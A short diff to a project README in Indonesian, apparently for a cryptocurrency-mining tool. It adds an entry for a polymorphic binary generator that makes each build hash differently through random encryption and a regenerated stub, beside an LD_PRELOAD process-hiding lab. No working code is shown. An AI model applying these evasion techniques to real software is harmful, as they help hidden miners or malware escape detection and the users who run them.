@@ -124,6 +124,9 @@ mengetahui prosesnya (root tetap bisa melihat/menghentikan). Build normal
   via LD_PRELOAD (interposisi `readdir`/`getdents64`). Batas tekniknya
   didokumentasikan di `labs/process-hide/README.md` — ini userland hiding,
   bukan stealth kernel.
+- `labs/polymorphic/` — generator polymorphic binary: tiap run menghasilkan
+  varian dengan sha256 berbeda tapi fungsi identik (enkripsi key stream acak
+  + stub assembly yang di-generate ulang: register/body/counter/NOP berbeda).
 
 `--selftest` wajib lolos sebelum mining: ia memverifikasi implementasi keccak
 hot-path (`len%72==71` dan kasus edge lain yang pernah salah di picosha3).
